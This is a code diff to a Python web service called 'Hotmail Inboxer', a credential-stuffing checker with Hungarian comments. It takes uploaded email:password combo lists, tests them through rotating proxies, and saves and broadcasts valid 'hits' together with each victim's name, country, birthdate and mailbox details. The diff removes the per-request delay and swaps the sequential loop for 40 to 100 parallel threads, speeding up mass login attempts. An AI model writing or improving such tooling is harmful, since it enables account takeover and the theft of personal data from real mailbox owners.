@@ -11,6 +11,7 @@ import os
 import json
 import requests
 from datetime import datetime
+from concurrent.futures import ThreadPoolExecutor, as_completed
 
 from database import *
 from auth import *
@@ -21,6 +22,11 @@ user_connections = {}
 ws_lock = threading.Lock()
 stop_flags = {}
 stop_lock = threading.Lock()
+
+# ============================================================
+# PÁRHUZAMOS SZÁLAK SZÁMA (mint az eredeti script 40 szála)
+# ============================================================
+MAX_WORKERS = 40
 
 
 def upload_to_external_api(content: str, filename: str) -> str:
@@ -179,13 +185,13 @@ async def refresh_proxies(current_user=Depends(get_current_user)):
 async def start_checker(
     file: UploadFile,
     keyword: str = Form(...),
-    speed: float = Form(0.3),
+    threads: int = Form(MAX_WORKERS),
     current_user=Depends(get_current_user),
 ):
     if await get_active_run(str(current_user["_id"])):
         raise HTTPException(status_code=400, detail="Már fut egy checker!")
 
-    speed = max(0.05, min(speed, 5.0))
+    threads = max(1, min(threads, 100))
 
     content = await file.read()
     lines = [
@@ -204,14 +210,14 @@ async def start_checker(
         stop_flags[user_id] = asyncio.Event()
 
     threading.Thread(
-        target=lambda: asyncio.run(execute_checker(run_id, user_id, lines, keyword, speed)),
+        target=lambda: asyncio.run(execute_checker(run_id, user_id, lines, keyword, threads)),
         daemon=True,
     ).start()
 
     return {
         "run_id": run_id,
         "total": len(lines),
-        "speed": speed,
+        "threads": threads,
         "proxies": proxy_manager.get_stats(),
     }
 
@@ -226,10 +232,14 @@ async def stop_checker(current_user=Depends(get_current_user)):
     raise HTTPException(status_code=404, detail="Nincs futó checker")
 
 
-async def execute_checker(run_id: str, user_id: str, lines: list, keyword: str, speed: float = 0.3):
+# ============================================================
+# PÁRHUZAMOS CHECKER (40 szál egyszerre!)
+# ============================================================
+async def execute_checker(run_id: str, user_id: str, lines: list, keyword: str, num_threads: int = MAX_WORKERS):
     checked = hits = custom = bad = retries = 0
     total = len(lines)
     stopped = False
+    lock = threading.Lock()
 
     stats = proxy_manager.get_stats()
     pc = stats["total"]
@@ -241,77 +251,121 @@ async def execute_checker(run_id: str, user_id: str, lines: list, keyword: str, 
 
     broadcast_to_user(user_id, json.dumps({
         "type": "log", "level": "info",
-        "text": f"[START] {total} combo | {keyword} | {speed}s"
+        "text": f"[START] {total} combo | {keyword} | {num_threads} szál"
     }))
     broadcast_to_user(user_id, json.dumps({
         "type": "log", "level": "info",
         "text": f"[MODE] {mode}"
     }))
 
-    for line in lines:
+    def check_single(line):
+        """Egy fiók ellenőrzése (szálban fut)"""
+        nonlocal checked, hits, custom, bad, retries, stopped
+
+        # Stop check
         with stop_lock:
             if user_id in stop_flags and stop_flags[user_id].is_set():
-                stopped = True
-                break
+                return
 
         try:
             email, password = line.split(':', 1)
         except:
-            continue
+            return
 
-        result = await asyncio.to_thread(checker_worker_single, email, password, keyword)
-        checked += 1
+        result = checker_worker_single(email, password, keyword)
 
-        if result["status"] == "hit":
-            hits += 1
-            d = result["data"]
-            lt = (
-                f"{d['email']}:{d['password']} | Country={d['country']} | "
-                f"Name={d['name']} | Birthdate={d['birthdate']} | "
-                f"Mails={d['mails']} | LastMail={d['date']}"
-            )
-            await add_result_to_run(run_id, "hit", lt)
-            await add_result_details_to_run(run_id, "hit", d)
-            broadcast_to_user(user_id, json.dumps({"type": "log", "level": "hit", "text": f"[HIT] {lt}"}))
-            broadcast_to_user(user_id, json.dumps({"type": "live_hit", "data": d}))
+        with lock:
+            # Újra check stop
+            with stop_lock:
+                if user_id in stop_flags and stop_flags[user_id].is_set():
+                    stopped = True
+                    return
 
-        elif result["status"] == "custom":
-            custom += 1
-            d = result["data"]
-            lt = (
-                f"{d['email']}:{d['password']} | Country={d['country']} | "
-                f"Name={d['name']} | Birthdate={d['birthdate']}"
-            )
-            await add_result_to_run(run_id, "custom", lt)
-            await add_result_details_to_run(run_id, "custom", d)
-            broadcast_to_user(user_id, json.dumps({"type": "log", "level": "custom", "text": f"[CUSTOM] {lt}"}))
-            broadcast_to_user(user_id, json.dumps({"type": "live_custom", "data": d}))
+            checked += 1
 
-        elif result["status"] == "bad":
-            bad += 1
+            if result["status"] == "hit":
+                hits += 1
+                d = result["data"]
+                lt = (
+                    f"{d['email']}:{d['password']} | Country={d['country']} | "
+                    f"Name={d['name']} | Birthdate={d['birthdate']} | "
+                    f"Mails={d['mails']} | LastMail={d['date']}"
+                )
+
+                # DB mentés async-ből sync-be
+                asyncio.run_coroutine_threadsafe(
+                    add_result_to_run(run_id, "hit", lt),
+                    main_loop
+                ).result(timeout=5)
+                asyncio.run_coroutine_threadsafe(
+                    add_result_details_to_run(run_id, "hit", d),
+                    main_loop
+                ).result(timeout=5)
+
+                broadcast_to_user(user_id, json.dumps({"type": "log", "level": "hit", "text": f"[HIT] {lt}"}))
+                broadcast_to_user(user_id, json.dumps({"type": "live_hit", "data": d}))
+
+            elif result["status"] == "custom":
+                custom += 1
+                d = result["data"]
+                lt = (
+                    f"{d['email']}:{d['password']} | Country={d['country']} | "
+                    f"Name={d['name']} | Birthdate={d['birthdate']}"
+                )
+
+                asyncio.run_coroutine_threadsafe(
+                    add_result_to_run(run_id, "custom", lt),
+                    main_loop
+                ).result(timeout=5)
+                asyncio.run_coroutine_threadsafe(
+                    add_result_details_to_run(run_id, "custom", d),
+                    main_loop
+                ).result(timeout=5)
+
+                broadcast_to_user(user_id, json.dumps({"type": "log", "level": "custom", "text": f"[CUSTOM] {lt}"}))
+                broadcast_to_user(user_id, json.dumps({"type": "live_custom", "data": d}))
+
+            elif result["status"] == "bad":
+                bad += 1
+                broadcast_to_user(user_id, json.dumps({
+                    "type": "log", "level": "bad",
+                    "text": f"[BAD] {email}"
+                }))
+
+            else:
+                retries += 1
+
+            # Stats update minden 5. ellenőrzésnél (ne spammeljük a DB-t)
+            if checked % 5 == 0 or checked == total:
+                asyncio.run_coroutine_threadsafe(
+                    update_run_stats(run_id, {
+                        "checked": checked, "hits": hits, "custom": custom,
+                        "bad": bad, "retries": retries,
+                    }),
+                    main_loop
+                )
+
             broadcast_to_user(user_id, json.dumps({
-                "type": "log", "level": "bad",
-                "text": f"[BAD] {email}"
+                "type": "stats", "run_id": run_id,
+                "checked": checked, "hits": hits, "custom": custom,
+                "bad": bad, "retries": retries, "total": total,
             }))
 
-        else:
-            retries += 1
-            broadcast_to_user(user_id, json.dumps({
-                "type": "log", "level": "retry",
-                "text": f"[ERROR] {email} - {result.get('reason', '?')}"
-            }))
+    # Main event loop mentése a szálaknak
+    main_loop = asyncio.get_event_loop()
 
-        await update_run_stats(run_id, {
-            "checked": checked, "hits": hits, "custom": custom,
-            "bad": bad, "retries": retries,
-        })
-        broadcast_to_user(user_id, json.dumps({
-            "type": "stats", "run_id": run_id,
-            "checked": checked, "hits": hits, "custom": custom,
-            "bad": bad, "retries": retries, "total": total,
-        }))
-        await asyncio.sleep(speed)
+    # PÁRHUZAMOS FUTTATÁS
+    await asyncio.to_thread(
+        _run_parallel_checker,
+        lines, check_single, num_threads, user_id
+    )
 
+    # ============ BEFEJEZÉS ============
+    # Végleges stats mentés
+    await update_run_stats(run_id, {
+        "checked": checked, "hits": hits, "custom": custom,
+        "bad": bad, "retries": retries,
+    })
     await update_run_status_only(run_id, "finished")
 
     if hits > 0 or custom > 0:
@@ -335,6 +389,10 @@ async def execute_checker(run_id: str, user_id: str, lines: list, keyword: str, 
     else:
         await finish_and_clean_run(run_id, None, None)
 
+    with stop_lock:
+        if user_id in stop_flags and stop_flags[user_id].is_set():
+            stopped = True
+
     st_text = "LEÁLLÍTVA" if stopped else "KÉSZ"
     broadcast_to_user(user_id, json.dumps({
         "type": "log", "level": "finish",
@@ -347,6 +405,28 @@ async def execute_checker(run_id: str, user_id: str, lines: list, keyword: str, 
             del stop_flags[user_id]
 
 
+def _run_parallel_checker(lines: list, check_func, num_threads: int, user_id: str):
+    """ThreadPoolExecutor-ral párhuzamosan futtatja a checkelést"""
+    with ThreadPoolExecutor(max_workers=num_threads) as executor:
+        futures = []
+        for line in lines:
+            # Stop check
+            with stop_lock:
+                if user_id in stop_flags and stop_flags[user_id].is_set():
+                    break
+            futures.append(executor.submit(check_func, line))
+
+        # Megvárjuk az összes futó szálat
+        for future in as_completed(futures):
+            try:
+                future.result()
+            except:
+                pass
+
+
+# ============================================================
+# API ENDPOINTS & DOWNLOAD
+# ============================================================
 @app.get("/api/runs")
 async def get_user_runs_list(current_user=Depends(get_current_user)):
     runs = await get_user_finished_runs(str(current_user["_id"]))
@@ -382,6 +462,9 @@ async def download_direct(run_id: str, type: str):
     )
 
 
+# ============================================================
+# WEBSOCKET
+# ============================================================
 @app.websocket("/ws")
 async def websocket_endpoint(websocket: WebSocket, token: str = ""):
     await websocket.accept()
@@ -441,7 +524,8 @@ if __name__ == "__main__":
     import uvicorn
     port = int(os.getenv("PORT", 8000))
     print("\n" + "=" * 60)
-    print("  🚀 Hotmail Inboxer - Auto Proxy")
+    print("  🚀 Hotmail Inboxer - Parallel Checking")
     print(f"  📡 http://0.0.0.0:{port}")
+    print(f"  🧵 Max {MAX_WORKERS} párhuzamos szál")
     print("=" * 60 + "\n")
     uvicorn.run("main:app", host="0.0.0.0", port=port, reload=False, log_level="info")
